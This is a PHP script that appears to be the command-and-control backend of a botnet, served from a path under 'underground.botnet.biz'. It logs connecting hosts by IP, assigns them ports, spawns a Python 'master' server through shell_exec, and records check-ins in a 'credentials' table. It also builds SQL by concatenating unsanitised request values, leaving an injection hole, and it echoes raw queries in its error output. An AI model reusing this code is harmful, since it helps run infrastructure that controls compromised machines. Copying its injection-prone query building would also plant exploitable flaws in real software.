<?php

/*
 * PORT ASSIGNER and MASTER SERVER SPAWNER
 *
 * @author Tomáš Keske
 * @simce 19.12.2018
 */

// Connect to database server and database
$mysqli =  new mysqli();

// If connection attempt failed, let us know
if ($mysqli->connect_errno) {
  echo "Sorry, this website is experiencing problems.";
  echo "Error: Failed to make a MySQL connection, here is why: \n";
  echo "Errno: " . $mysqli->connect_errno . "\n";
  echo "Error: " . $mysqli->connect_error . "\n";
  exit;
}

function outputQueryResults($mysqli) { 

	$ip = $_SERVER['REMOTE_ADDR'];

	$sql = "SELECT * FROM ports WHERE ip ='". $ip ."'";

	// run the query 
	if (!$result = $mysqli->query($sql)) {
	  // Handle error
	  echo "Sorry, this website is experiencing problems.";
	  echo "Error: Query failed to execute, here is why: \n";
	  echo "Query: " . $sql . "\n";
	  echo "Errno: " . $mysqli->errno . "\n";
	  echo "Error: " . $mysqli->error . "\n";
	  exit;
	}

	// if entry does not exist yet
	if ($result->num_rows === 0) {
	    
	    $sql2 = "SELECT * FROM ports WHERE id=(SELECT MAX(id) FROM ports)";
	    
		if (!$result = $mysqli->query($sql2)) {
		  // Handle error
		  echo "Sorry, this website is experiencing problems.";
		  echo "Error: Query failed to execute, here is why: \n";
		  echo "Query: " . $sql . "\n";
		  echo "Errno: " . $mysqli->errno . "\n";
		  echo "Error: " . $mysqli->error . "\n";
		  exit;
		}

		while ($row = $result->fetch_assoc()) {     

		   $port = $row['connection_port']; 

		}

		$port = intval($port);
		$port = $port+1;
		$conn_port = random_int(60000, 65534);
		$ret = array("port" => $port, "connection_port" => $conn_port);

		$sql3 = "INSERT INTO ports (ip, port, connection_port) VALUES ('".$ip."','".$port."','". $conn_port."')";

		if (!$xx = $mysqli->query($sql3)) {
		  // Handle error
		  echo "Sorry, this website is experiencing problems.";
		  echo "Error: Query failed to execute, here is why: \n";
		  echo "Query: " . $sql . "\n";
		  echo "Errno: " . $mysqli->errno . "\n";
		  echo "Error: " . $mysqli->error . "\n";
		  exit;
		}

		echo $port.":".$conn_port;
		return $ret;
	}

	//return information that exists
	while ($row = $result->fetch_assoc()) {     

	   $ret = array("port" => $row['port'], "connection_port" => $row["connection_port"]);
	   echo $row['port'].":".$row["connection_port"]; 
	   return $ret;

	}
}

function spawnTheMaster($array){

	shell_exec('nohup /usr/bin/python3 /var/www/underground.botnet.biz/web/www/master.py -m 0.0.0.0:'.$array["port"].' -c 0.0.0.0:'.$array["connection_port"].' > /dev/null 2>&1 &');
}
 

if (!$_GET["status"]){
	// run query and output results 
	$portArray = outputQueryResults($mysqli); 

	// close database connection 
	mysqli_close($mysqli);

	//spawn the master server
	spawnTheMaster($portArray);
} else {

	$sql = "UPDATE credentials SET status = '".$_GET["status"]."', last_online = '".date("d-m-Y H:i:s", time())."' WHERE ip = '".$ip."';";


	if (!$result = $mysqli->query($sql)) {
	  // Handle error
	  echo "Sorry, this website is experiencing problems.";
	  echo "Error: Query failed to execute, here is why: \n";
	  echo "Query: " . $sql . "\n";
	  echo "Errno: " . $mysqli->errno . "\n";
	  echo "Error: " . $mysqli->error . "\n";
	  exit;
	}

	mysqli_close($mysqli);

	echo "*ok*";

}

?>
